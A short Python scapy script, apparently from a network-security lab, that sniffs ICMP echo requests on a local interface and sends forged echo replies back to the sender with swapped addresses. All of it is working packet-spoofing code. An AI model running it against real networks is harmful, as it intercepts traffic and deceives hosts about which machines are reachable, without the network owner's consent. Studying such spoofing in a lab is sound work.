# packet sniffing & spoof
#!/usr/local/bin/python3
from scapy.all import *

print("SNIFFING PACKETS...")

def spoof_pkt(pkt):
    if ICMP in pkt and pkt[ICMP].type==8:
        print("ORIGINAL PACKET....")
        print("SOURCE IP: ",pkt[IP].src)
        print("DESTINATION IP: ",pkt[IP].dst)
        src_port=RandShort()
        ip=IP(src=pkt[IP].dst,dst=pkt[IP].src,ihl=pkt[IP].ihl)
        icmp=ICMP(type=0,id=pkt[ICMP].id,seq=pkt[ICMP].seq)
        data=pkt[Raw].load
        newpkt=ip/icmp/data
        print("The PACKET is SPOOFED...")
        print("SOURCE IP: ",newpkt[IP].src)
        print("DESTINATION IP: ",newpkt[IP].dst)
        send(newpkt,verbose=0)

pkt=sniff(iface="ens33",filter="icmp",prn=spoof_pkt)